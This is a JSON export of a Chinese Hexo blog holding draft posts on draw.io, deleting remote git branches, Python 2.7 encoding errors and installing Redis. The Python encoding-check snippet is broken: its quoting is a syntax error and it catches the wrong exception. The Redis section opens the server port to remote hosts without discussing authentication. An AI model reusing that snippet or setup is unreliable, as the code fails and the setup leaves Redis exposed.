[完全免费、强大、专业、易用、高效的在线UML模型绘制工具–draw.io](http://2sharings.com/2015/nice-easy-uml-online-tool-draw-io)","source":"_drafts/article/tool/制图工具draw.io简介.md","raw":"tags:\n  - 制图\n  - draw.io\ncategories:\n  - 工具软件\ntitle: 制图工具draw.io简介\ndate: 2016-04-18 13:28:00\n---\n\n## 一、概述\ndraw.io 是一款非常好用的在线绘制流程图的工具，提供了流程图，UML图等丰富的接口。\n\n在线画图：https://www.draw.io/\nchrome插件（draw io desktop）：https://chrome.google.com/webstore/detail/drawio-desktop/pebppomjfocnoigkeepgbmcifnnlndla\n\n## 二、功能\n\n\n## 三、参考文档\n1. [draw.io - 免费的流程图绘制工具](http://www.swiftcafe.io/2015/12/28/drawio/)\n2. [完全免费、强大、专业、易用、高效的在线UML模型绘制工具–draw.io](http://2sharings.com/2015/nice-easy-uml-online-tool-draw-io)","slug":"article/tool/制图工具draw.io简介","published":0,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxop000j5nbtn0fw6v7x","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>draw.io 是一款非常好用的在线绘制流程图的工具，提供了流程图，UML图等丰富的接口。</p>\n<p>在线画图：<a href=\"https://www.draw.io/\" target=\"_blank\" rel=\"external\">https://www.draw.io/</a><br>chrome插件（draw io desktop）：<a href=\"https://chrome.google.com/webstore/detail/drawio-desktop/pebppomjfocnoigkeepgbmcifnnlndla\" target=\"_blank\" rel=\"external\">https://chrome.google.com/webstore/detail/drawio-desktop/pebppomjfocnoigkeepgbmcifnnlndla</a></p>\n<h2 id=\"二、功能\"><a href=\"#二、功能\" class=\"headerlink\" title=\"二、功能\"></a>二、功能</h2><h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><ol>\n<li><a href=\"http://www.swiftcafe.io/2015/12/28/drawio/\" target=\"_blank\" rel=\"external\">draw.io - 免费的流程图绘制工具</a></li>\n<li><a href=\"http://2sharings.com/2015/nice-easy-uml-online-tool-draw-io\" target=\"_blank\" rel=\"external\">完全免费、强大、专业、易用、高效的在线UML模型绘制工具–draw.io</a></li>\n</ol>\n","excerpt":"","more":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>draw.io 是一款非常好用的在线绘制流程图的工具，提供了流程图，UML图等丰富的接口。</p>\n<p>在线画图：<a href=\"https://www.draw.io/\">https://www.draw.io/</a><br>chrome插件（draw io desktop）：<a href=\"https://chrome.google.com/webstore/detail/drawio-desktop/pebppomjfocnoigkeepgbmcifnnlndla\">https://chrome.google.com/webstore/detail/drawio-desktop/pebppomjfocnoigkeepgbmcifnnlndla</a></p>\n<h2 id=\"二、功能\"><a href=\"#二、功能\" class=\"headerlink\" title=\"二、功能\"></a>二、功能</h2><h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><ol>\n<li><a href=\"http://www.swiftcafe.io/2015/12/28/drawio/\">draw.io - 免费的流程图绘制工具</a></li>\n<li><a href=\"http://2sharings.com/2015/nice-easy-uml-online-tool-draw-io\">完全免费、强大、专业、易用、高效的在线UML模型绘制工具–draw.io</a></li>\n</ol>\n"},{"title":"git删除远程分支","date":"2016-03-11T10:33:26.000Z","_content":"\n\n如果不再需要某个远程分支了，比如搞定了某个特性并把它合并进了远程的 master 分支（或任何其他存放稳定代码的分支），可以用这个非常无厘头的语法来删除它：git push [远程名] :[分支名]。如果想在服务器上删除 serverfix 分支，运行下面的命令：\n\n``` bash\n$ git push origin :serverfix\nTo git@github.com:schacon/simplegit.git\n - [deleted]         serverfix\n```\n\n咚！服务器上的分支没了。你最好特别留心这一页，因为你一定会用到那个命令，而且你很可能会忘掉它的语法。有种方便记忆这条命令的方法：记住我们不久前见过的 git push [远程名] [本地分支]:[远程分支] 语法，如果省略 [本地分支]，那就等于是在说“在这里提取空白然后把它变成[远程分支]”。","source":"_drafts/article/git/git删除远程分支.md","raw":"title: git删除远程分支\ndate: 2016-03-11 18:33:26\n---\n\n\n如果不再需要某个远程分支了，比如搞定了某个特性并把它合并进了远程的 master 分支（或任何其他存放稳定代码的分支），可以用这个非常无厘头的语法来删除它：git push [远程名] :[分支名]。如果想在服务器上删除 serverfix 分支，运行下面的命令：\n\n``` bash\n$ git push origin :serverfix\nTo git@github.com:schacon/simplegit.git\n - [deleted]         serverfix\n```\n\n咚！服务器上的分支没了。你最好特别留心这一页，因为你一定会用到那个命令，而且你很可能会忘掉它的语法。有种方便记忆这条命令的方法：记住我们不久前见过的 git push [远程名] [本地分支]:[远程分支] 语法，如果省略 [本地分支]，那就等于是在说“在这里提取空白然后把它变成[远程分支]”。","slug":"article/git/git删除远程分支","published":0,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxor000l5nbtpkio4qfe","content":"<p>如果不再需要某个远程分支了，比如搞定了某个特性并把它合并进了远程的 master 分支（或任何其他存放稳定代码的分支），可以用这个非常无厘头的语法来删除它：git push [远程名] :[分支名]。如果想在服务器上删除 serverfix 分支，运行下面的命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ git push origin :serverfix</div><div class=\"line\">To git@github.com:schacon/simplegit.git</div><div class=\"line\"> - [deleted]         serverfix</div></pre></td></tr></table></figure>\n<p>咚！服务器上的分支没了。你最好特别留心这一页，因为你一定会用到那个命令，而且你很可能会忘掉它的语法。有种方便记忆这条命令的方法：记住我们不久前见过的 git push [远程名] [本地分支]:[远程分支] 语法，如果省略 [本地分支]，那就等于是在说“在这里提取空白然后把它变成[远程分支]”。</p>\n","excerpt":"","more":"<p>如果不再需要某个远程分支了，比如搞定了某个特性并把它合并进了远程的 master 分支（或任何其他存放稳定代码的分支），可以用这个非常无厘头的语法来删除它：git push [远程名] :[分支名]。如果想在服务器上删除 serverfix 分支，运行下面的命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ git push origin :serverfix</div><div class=\"line\">To git@github.com:schacon/simplegit.git</div><div class=\"line\"> - [deleted]         serverfix</div></pre></td></tr></table></figure>\n<p>咚！服务器上的分支没了。你最好特别留心这一页，因为你一定会用到那个命令，而且你很可能会忘掉它的语法。有种方便记忆这条命令的方法：记住我们不久前见过的 git push [远程名] [本地分支]:[远程分支] 语法，如果省略 [本地分支]，那就等于是在说“在这里提取空白然后把它变成[远程分支]”。</p>\n"},{"title":"python中文乱码","date":"2016-05-25T12:33:00.000Z","_content":"<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n本文内容基于python2.7而言，python3不在讨论范围内。\n\n## 一、背景\n在python文件中定义一个包含中文的字符串，打印到console不会出现乱码，但是将内容输出到文件里时，报如下异常：\n```\nTraceback (most recent call last):\n  File \"encoding.py\", line 24, in <module>\n    dumpFile(s);\n  File \"encoding.py\", line 8, in dumpFile\n    result = result.encode('utf-8')\nUnicodeDecodeError: 'ascii' codec can't decode byte 0xe8 in position 0: ordinal not in range(128)\n```\n\n\n## 二、python字符编码\nPython里面有两种数据模型来支持字符串这种数据类型，一种是str，另外一种是unicode，它们都是sequence 的派生类。\nstr：是指带有编码的字符串；unicode：是指不带编码的字符串。\n\n### 1. 编码: unicode -> str\nunicode编码的字符串可以通过encode(charset)函数，转成str字符串。\n\n### 2. 解码: str -> unicode\nstr字符串也可以通过decode(charset)函数，转成unicode字符串。\n\n### 3. 附加知识\nisinstance()：用于判断对象是否某个类型\n`__class__`：python对象内置属性，用于查看对象所属的类型。\ntype(): 查看对象类型。\n\n\n## 三、编码\n\n### 1. 源文件编码\npython2.7默认脚本文件编码方式为ASCII，如果代码中出现非ASCII编码的字符则会报错。\n可以采用如下方式指定脚本中出现字符串的编码方式:\n```\n# -*- coding: utf-8 -*-\n# coding=utf-8\n```\n\n### 2. 内部转换编码\npython内部数据存储编码格式是unicode编码。\n对于代码文件中出现的非unicode编码的字符串，python会统一转成unicode编码存储。\n\n对于控制台字符串输出，\n对于文件导出或网络数据传输，由于python并不知道需要保存\n\n```\nimport sys\nreload(sys)\nsys.setdefaultencoding('utf-8')\n```\n\n## 五、检查字符编码方式\n``` python\ndef encoding(s):\n    cl = [''utf8'', ''gb2312'']\n    for a in cl:\n        try:\n            s.decode(a)\n            return a\n        except UnicodeEncodeError:\n            pass\n    return ''unknown''\n```\n\n\n## 六、参考文档\n- [也谈 Python 的中文编码处理](http://in355hz.iteye.com/blog/1860787)\n- [【转】Python 编码问题整理  ](http://blog.163.com/sea_haitao/blog/static/775621620096412211732/)\n- [python 中文乱码问题深入分析](http://www.jb51.net/article/26543.htm)\n\n","source":"_drafts/article/python/python中文乱码.md","raw":"title: python中文乱码\ntags:\n  - python\ncategories:\n  - 系统脚本\ndate: 2016-05-25 20:33:00\n---\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n本文内容基于python2.7而言，python3不在讨论范围内。\n\n## 一、背景\n在python文件中定义一个包含中文的字符串，打印到console不会出现乱码，但是将内容输出到文件里时，报如下异常：\n```\nTraceback (most recent call last):\n  File \"encoding.py\", line 24, in <module>\n    dumpFile(s);\n  File \"encoding.py\", line 8, in dumpFile\n    result = result.encode('utf-8')\nUnicodeDecodeError: 'ascii' codec can't decode byte 0xe8 in position 0: ordinal not in range(128)\n```\n\n\n## 二、python字符编码\nPython里面有两种数据模型来支持字符串这种数据类型，一种是str，另外一种是unicode，它们都是sequence 的派生类。\nstr：是指带有编码的字符串；unicode：是指不带编码的字符串。\n\n### 1. 编码: unicode -> str\nunicode编码的字符串可以通过encode(charset)函数，转成str字符串。\n\n### 2. 解码: str -> unicode\nstr字符串也可以通过decode(charset)函数，转成unicode字符串。\n\n### 3. 附加知识\nisinstance()：用于判断对象是否某个类型\n`__class__`：python对象内置属性，用于查看对象所属的类型。\ntype(): 查看对象类型。\n\n\n## 三、编码\n\n### 1. 源文件编码\npython2.7默认脚本文件编码方式为ASCII，如果代码中出现非ASCII编码的字符则会报错。\n可以采用如下方式指定脚本中出现字符串的编码方式:\n```\n# -*- coding: utf-8 -*-\n# coding=utf-8\n```\n\n### 2. 内部转换编码\npython内部数据存储编码格式是unicode编码。\n对于代码文件中出现的非unicode编码的字符串，python会统一转成unicode编码存储。\n\n对于控制台字符串输出，\n对于文件导出或网络数据传输，由于python并不知道需要保存\n\n```\nimport sys\nreload(sys)\nsys.setdefaultencoding('utf-8')\n```\n\n## 五、检查字符编码方式\n``` python\ndef encoding(s):\n    cl = [''utf8'', ''gb2312'']\n    for a in cl:\n        try:\n            s.decode(a)\n            return a\n        except UnicodeEncodeError:\n            pass\n    return ''unknown''\n```\n\n\n## 六、参考文档\n- [也谈 Python 的中文编码处理](http://in355hz.iteye.com/blog/1860787)\n- [【转】Python 编码问题整理  ](http://blog.163.com/sea_haitao/blog/static/775621620096412211732/)\n- [python 中文乱码问题深入分析](http://www.jb51.net/article/26543.htm)\n\n","slug":"article/python/python中文乱码","published":0,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxot000o5nbtmmfe64s5","content":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\"></p>\n<p>本文内容基于python2.7而言，python3不在讨论范围内。</p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>在python文件中定义一个包含中文的字符串，打印到console不会出现乱码，但是将内容输出到文件里时，报如下异常：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">Traceback (most recent call last):</div><div class=\"line\">  File &quot;encoding.py&quot;, line 24, in &lt;module&gt;</div><div class=\"line\">    dumpFile(s);</div><div class=\"line\">  File &quot;encoding.py&quot;, line 8, in dumpFile</div><div class=\"line\">    result = result.encode(&apos;utf-8&apos;)</div><div class=\"line\">UnicodeDecodeError: &apos;ascii&apos; codec can&apos;t decode byte 0xe8 in position 0: ordinal not in range(128)</div></pre></td></tr></table></figure></p>\n<h2 id=\"二、python字符编码\"><a href=\"#二、python字符编码\" class=\"headerlink\" title=\"二、python字符编码\"></a>二、python字符编码</h2><p>Python里面有两种数据模型来支持字符串这种数据类型，一种是str，另外一种是unicode，它们都是sequence 的派生类。<br>str：是指带有编码的字符串；unicode：是指不带编码的字符串。</p>\n<h3 id=\"1-编码-unicode-gt-str\"><a href=\"#1-编码-unicode-gt-str\" class=\"headerlink\" title=\"1. 编码: unicode -&gt; str\"></a>1. 编码: unicode -&gt; str</h3><p>unicode编码的字符串可以通过encode(charset)函数，转成str字符串。</p>\n<h3 id=\"2-解码-str-gt-unicode\"><a href=\"#2-解码-str-gt-unicode\" class=\"headerlink\" title=\"2. 解码: str -&gt; unicode\"></a>2. 解码: str -&gt; unicode</h3><p>str字符串也可以通过decode(charset)函数，转成unicode字符串。</p>\n<h3 id=\"3-附加知识\"><a href=\"#3-附加知识\" class=\"headerlink\" title=\"3. 附加知识\"></a>3. 附加知识</h3><p>isinstance()：用于判断对象是否某个类型<br><code>__class__</code>：python对象内置属性，用于查看对象所属的类型。<br>type(): 查看对象类型。</p>\n<h2 id=\"三、编码\"><a href=\"#三、编码\" class=\"headerlink\" title=\"三、编码\"></a>三、编码</h2><h3 id=\"1-源文件编码\"><a href=\"#1-源文件编码\" class=\"headerlink\" title=\"1. 源文件编码\"></a>1. 源文件编码</h3><p>python2.7默认脚本文件编码方式为ASCII，如果代码中出现非ASCII编码的字符则会报错。<br>可以采用如下方式指定脚本中出现字符串的编码方式:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"># -*- coding: utf-8 -*-</div><div class=\"line\"># coding=utf-8</div></pre></td></tr></table></figure></p>\n<h3 id=\"2-内部转换编码\"><a href=\"#2-内部转换编码\" class=\"headerlink\" title=\"2. 内部转换编码\"></a>2. 内部转换编码</h3><p>python内部数据存储编码格式是unicode编码。<br>对于代码文件中出现的非unicode编码的字符串，python会统一转成unicode编码存储。</p>\n<p>对于控制台字符串输出，<br>对于文件导出或网络数据传输，由于python并不知道需要保存</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">import sys</div><div class=\"line\">reload(sys)</div><div class=\"line\">sys.setdefaultencoding(&apos;utf-8&apos;)</div></pre></td></tr></table></figure>\n<h2 id=\"五、检查字符编码方式\"><a href=\"#五、检查字符编码方式\" class=\"headerlink\" title=\"五、检查字符编码方式\"></a>五、检查字符编码方式</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encoding</span><span class=\"params\">(s)</span>:</span></div><div class=\"line\">    cl = [<span class=\"string\">''</span>utf8<span class=\"string\">''</span>, <span class=\"string\">''</span>gb2312<span class=\"string\">''</span>]</div><div class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> cl:</div><div class=\"line\">        <span class=\"keyword\">try</span>:</div><div class=\"line\">            s.decode(a)</div><div class=\"line\">            <span class=\"keyword\">return</span> a</div><div class=\"line\">        <span class=\"keyword\">except</span> UnicodeEncodeError:</div><div class=\"line\">            <span class=\"keyword\">pass</span></div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">''</span>unknown<span class=\"string\">''</span></div></pre></td></tr></table></figure>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><ul>\n<li><a href=\"http://in355hz.iteye.com/blog/1860787\" target=\"_blank\" rel=\"external\">也谈 Python 的中文编码处理</a></li>\n<li><a href=\"http://blog.163.com/sea_haitao/blog/static/775621620096412211732/\" target=\"_blank\" rel=\"external\">【转】Python 编码问题整理  </a></li>\n<li><a href=\"http://www.jb51.net/article/26543.htm\" target=\"_blank\" rel=\"external\">python 中文乱码问题深入分析</a></li>\n</ul>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" /></p>\n<p>本文内容基于python2.7而言，python3不在讨论范围内。</p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>在python文件中定义一个包含中文的字符串，打印到console不会出现乱码，但是将内容输出到文件里时，报如下异常：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">Traceback (most recent call last):</div><div class=\"line\">  File &quot;encoding.py&quot;, line 24, in &lt;module&gt;</div><div class=\"line\">    dumpFile(s);</div><div class=\"line\">  File &quot;encoding.py&quot;, line 8, in dumpFile</div><div class=\"line\">    result = result.encode(&apos;utf-8&apos;)</div><div class=\"line\">UnicodeDecodeError: &apos;ascii&apos; codec can&apos;t decode byte 0xe8 in position 0: ordinal not in range(128)</div></pre></td></tr></table></figure></p>\n<h2 id=\"二、python字符编码\"><a href=\"#二、python字符编码\" class=\"headerlink\" title=\"二、python字符编码\"></a>二、python字符编码</h2><p>Python里面有两种数据模型来支持字符串这种数据类型，一种是str，另外一种是unicode，它们都是sequence 的派生类。<br>str：是指带有编码的字符串；unicode：是指不带编码的字符串。</p>\n<h3 id=\"1-编码-unicode-gt-str\"><a href=\"#1-编码-unicode-gt-str\" class=\"headerlink\" title=\"1. 编码: unicode -&gt; str\"></a>1. 编码: unicode -&gt; str</h3><p>unicode编码的字符串可以通过encode(charset)函数，转成str字符串。</p>\n<h3 id=\"2-解码-str-gt-unicode\"><a href=\"#2-解码-str-gt-unicode\" class=\"headerlink\" title=\"2. 解码: str -&gt; unicode\"></a>2. 解码: str -&gt; unicode</h3><p>str字符串也可以通过decode(charset)函数，转成unicode字符串。</p>\n<h3 id=\"3-附加知识\"><a href=\"#3-附加知识\" class=\"headerlink\" title=\"3. 附加知识\"></a>3. 附加知识</h3><p>isinstance()：用于判断对象是否某个类型<br><code>__class__</code>：python对象内置属性，用于查看对象所属的类型。<br>type(): 查看对象类型。</p>\n<h2 id=\"三、编码\"><a href=\"#三、编码\" class=\"headerlink\" title=\"三、编码\"></a>三、编码</h2><h3 id=\"1-源文件编码\"><a href=\"#1-源文件编码\" class=\"headerlink\" title=\"1. 源文件编码\"></a>1. 源文件编码</h3><p>python2.7默认脚本文件编码方式为ASCII，如果代码中出现非ASCII编码的字符则会报错。<br>可以采用如下方式指定脚本中出现字符串的编码方式:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"># -*- coding: utf-8 -*-</div><div class=\"line\"># coding=utf-8</div></pre></td></tr></table></figure></p>\n<h3 id=\"2-内部转换编码\"><a href=\"#2-内部转换编码\" class=\"headerlink\" title=\"2. 内部转换编码\"></a>2. 内部转换编码</h3><p>python内部数据存储编码格式是unicode编码。<br>对于代码文件中出现的非unicode编码的字符串，python会统一转成unicode编码存储。</p>\n<p>对于控制台字符串输出，<br>对于文件导出或网络数据传输，由于python并不知道需要保存</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">import sys</div><div class=\"line\">reload(sys)</div><div class=\"line\">sys.setdefaultencoding(&apos;utf-8&apos;)</div></pre></td></tr></table></figure>\n<h2 id=\"五、检查字符编码方式\"><a href=\"#五、检查字符编码方式\" class=\"headerlink\" title=\"五、检查字符编码方式\"></a>五、检查字符编码方式</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encoding</span><span class=\"params\">(s)</span>:</span></div><div class=\"line\">    cl = [<span class=\"string\">''</span>utf8<span class=\"string\">''</span>, <span class=\"string\">''</span>gb2312<span class=\"string\">''</span>]</div><div class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> cl:</div><div class=\"line\">        <span class=\"keyword\">try</span>:</div><div class=\"line\">            s.decode(a)</div><div class=\"line\">            <span class=\"keyword\">return</span> a</div><div class=\"line\">        <span class=\"keyword\">except</span> UnicodeEncodeError:</div><div class=\"line\">            <span class=\"keyword\">pass</span></div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">''</span>unknown<span class=\"string\">''</span></div></pre></td></tr></table></figure>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><ul>\n<li><a href=\"http://in355hz.iteye.com/blog/1860787\">也谈 Python 的中文编码处理</a></li>\n<li><a href=\"http://blog.163.com/sea_haitao/blog/static/775621620096412211732/\">【转】Python 编码问题整理  </a></li>\n<li><a href=\"http://www.jb51.net/article/26543.htm\">python 中文乱码问题深入分析</a></li>\n</ul>\n"},{"_content":"\n\n如何玩转 WorkFlowy？\nhttps://www.zhihu.com/question/20491194\n\n\nhttps://workflowy.zendesk.com/hc/en-us/articles/202609829-Color-Formatting\n\nhttp://www.appinn.com/workflowy/\n\nhttps://www.douban.com/note/273739451/","source":"_drafts/article/tool/workflowy.md","raw":"\n\n如何玩转 WorkFlowy？\nhttps://www.zhihu.com/question/20491194\n\n\nhttps://workflowy.zendesk.com/hc/en-us/articles/202609829-Color-Formatting\n\nhttp://www.appinn.com/workflowy/\n\nhttps://www.douban.com/note/273739451/","slug":"article/tool/workflowy","published":0,"date":"2016-08-20T07:13:48.000Z","updated":"2016-08-20T07:13:48.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxov000p5nbtkfizpkcf","content":"<p>如何玩转 WorkFlowy？<br><a href=\"https://www.zhihu.com/question/20491194\" target=\"_blank\" rel=\"external\">https://www.zhihu.com/question/20491194</a></p>\n<p><a href=\"https://workflowy.zendesk.com/hc/en-us/articles/202609829-Color-Formatting\" target=\"_blank\" rel=\"external\">https://workflowy.zendesk.com/hc/en-us/articles/202609829-Color-Formatting</a></p>\n<p><a href=\"http://www.appinn.com/workflowy/\" target=\"_blank\" rel=\"external\">http://www.appinn.com/workflowy/</a></p>\n<p><a href=\"https://www.douban.com/note/273739451/\" target=\"_blank\" rel=\"external\">https://www.douban.com/note/273739451/</a></p>\n","excerpt":"","more":"<p>如何玩转 WorkFlowy？<br><a href=\"https://www.zhihu.com/question/20491194\">https://www.zhihu.com/question/20491194</a></p>\n<p><a href=\"https://workflowy.zendesk.com/hc/en-us/articles/202609829-Color-Formatting\">https://workflowy.zendesk.com/hc/en-us/articles/202609829-Color-Formatting</a></p>\n<p><a href=\"http://www.appinn.com/workflowy/\">http://www.appinn.com/workflowy/</a></p>\n<p><a href=\"https://www.douban.com/note/273739451/\">https://www.douban.com/note/273739451/</a></p>\n"},{"title":"redis单机多实例部署","date":"2015-12-29T05:58:00.000Z","_content":"\n[TOC]\n\n## 一、redis安装\n\n## Redis介绍\nRedis是一种高级key-value数据库。它跟memcached类似，不过数据可以持久化，而且支持的数据类型很丰富。有字符串，链表、哈希、集合和有序集合5种。支持在服务器端计算集合的并、交和补集(difference)等，还支持多种排序功能。所以Redis也可以被看成是一个数据结构服务器。Redis的所有数据都是保存在内存中，然后不定期的通过异步方式保存到磁盘上(这称为“半持久化模式”)；也可以把每一次数据变化都写入到一个append only file(aof)里面(这称为“全持久化模式”)。\n\n### 1. 下载redis\n``` shell\ncd /opt/work/local\n\nwget -c http://download.redis.io/releases/redis-3.0.3.tar.gz\ntar -zxvf redis-3.0.3.tar.gz\n```\n解压后的文件目录如下：\n![解压后的Redis目录结构](http://images.cnitblog.com/i/420264/201404/191557148074939.jpg)\n\n### 2. 编译redis\n``` shell\ncd /opt/work/local/redis-3.0.3\nmake\n```\n\n### 3. 拷贝产生的可执行命令\n``` shell\nmkdir -p /opt/work/local/redis/bin\ncd /opt/work/local/redis-3.0.3/src\ncp -p redis-benchmark redis-check-aof redis-check-dump redis-cli redis-sentinel redis-server mkreleasehdr.sh /opt/work/local/redis/bin\n```\n\n### 4. redis服务启动\n(1) 修改环境变量(vim  ~/.bash_profile)如下：\n``` shell\nREDIS_HOME=/opt/work/local/redis\n\nPATH=$PATH:$HOME/bin:$REDIS_HOME/bin\n```\n\n(2) 修改完成后，记得使用`source ~/.bash_profile`生效。\n\n(3) 查看redis-server使用文档\n``` shell\n[@zw_25_105 local]# redis-server --help\nUsage: ./redis-server [/path/to/redis.conf] [options]\n       ./redis-server - (read config from stdin)\n       ./redis-server -v or --version\n       ./redis-server -h or --help\n       ./redis-server --test-memory <megabytes>\n\nExamples:\n       ./redis-server (run the server with default conf)\n       ./redis-server /etc/redis/6379.conf\n       ./redis-server --port 7777\n       ./redis-server --port 7777 --slaveof 127.0.0.1 8888\n       ./redis-server /etc/myredis.conf --loglevel verbose\n\nSentinel mode:\n       ./redis-server /etc/sentinel.conf --sentinel\n```\n\n(4) 启动单机redis\n使用默认的参数启动redis：`redis-server`\n指定端口启动redis：`redis-server --port 6380`\n\n(5) 允许redis端口远程连接\n修改防火墙配置文件，如下所示：\n``` shell\nvim /etc/sysconfig/iptables\n\n# 添加一行\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 6380 -j ACCEPT\n\n# 重新加载规则\nservice iptables restart\n```\n\n至此你就可以用客户端redis-cli连接了：`redis-cli -h 127.0.0.1 -p 6380`\n\n<!-- more -->\n\n## 二、redis主从配置\n\n\n## 三、redis sentinel配置\n\n\n\n\n\n## 四、参考文档：\n[Redis安装及主从配置](!http://www.cnblogs.com/liuling/p/2014-4-19-02.html)\n[centos 安装redis（一台机器可以安装多个redis）](!http://www.cnblogs.com/eric-z/p/4153101.html)\n[在一台机器上搭建多个redis实例](!http://my.oschina.net/liuke1556/blog/287594)\n","source":"_posts/article/cache/redis单机多实例部署.md","raw":"categories:\n  - 数据存储\ntitle: redis单机多实例部署\ntags:\n  - redis\n  - cache\ndate: 2015-12-29 13:58:00\n---\n\n[TOC]\n\n## 一、redis安装\n\n## Redis介绍\nRedis是一种高级key-value数据库。它跟memcached类似，不过数据可以持久化，而且支持的数据类型很丰富。有字符串，链表、哈希、集合和有序集合5种。支持在服务器端计算集合的并、交和补集(difference)等，还支持多种排序功能。所以Redis也可以被看成是一个数据结构服务器。Redis的所有数据都是保存在内存中，然后不定期的通过异步方式保存到磁盘上(这称为“半持久化模式”)；也可以把每一次数据变化都写入到一个append only file(aof)里面(这称为“全持久化模式”)。\n\n### 1. 下载redis\n``` shell\ncd /opt/work/local\n\nwget -c http://download.redis.io/releases/redis-3.0.3.tar.gz\ntar -zxvf redis-3.0.3.tar.gz\n```\n解压后的文件目录如下：\n![解压后的Redis目录结构](http://images.cnitblog.com/i/420264/201404/191557148074939.jpg)\n\n### 2. 编译redis\n``` shell\ncd /opt/work/local/redis-3.0.3\nmake\n```\n\n### 3. 拷贝产生的可执行命令\n``` shell\nmkdir -p /opt/work/local/redis/bin\ncd /opt/work/local/redis-3.0.3/src\ncp -p redis-benchmark redis-check-aof redis-check-dump redis-cli redis-sentinel redis-server mkreleasehdr.sh /opt/work/local/redis/bin\n```\n\n### 4. redis服务启动\n(1) 修改环境变量(vim  ~/.bash_profile)如下：\n``` shell\nREDIS_HOME=/opt/work/local/redis\n\nPATH=$PATH:$HOME/bin:$REDIS_HOME/bin\n```\n\n(2) 修改完成后，记得使用`source ~/.bash_profile`生效。\n\n(3) 查看redis-server使用文档\n``` shell\n[@zw_25_105 local]# redis-server --help\nUsage: ./redis-server [/path/to/redis.conf] [options]\n       ./redis-server - (read config from stdin)\n       ./redis-server -v or --version\n       ./redis-server -h or --help\n       ./redis-server --test-memory <megabytes>\n\nExamples:\n       ./redis-server (run the server with default conf)\n       ./redis-server /etc/redis/6379.conf\n       ./redis-server --port 7777\n       ./redis-server --port 7777 --slaveof 127.0.0.1 8888\n       ./redis-server /etc/myredis.conf --loglevel verbose\n\nSentinel mode:\n       ./redis-server /etc/sentinel.conf --sentinel\n```\n\n(4) 启动单机redis\n使用默认的参数启动redis：`redis-server`\n指定端口启动redis：`redis-server --port 6380`\n\n(5) 允许redis端口远程连接\n修改防火墙配置文件，如下所示：\n``` shell\nvim /etc/sysconfig/iptables\n\n# 添加一行\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 6380 -j ACCEPT\n\n# 重新加载规则\nservice 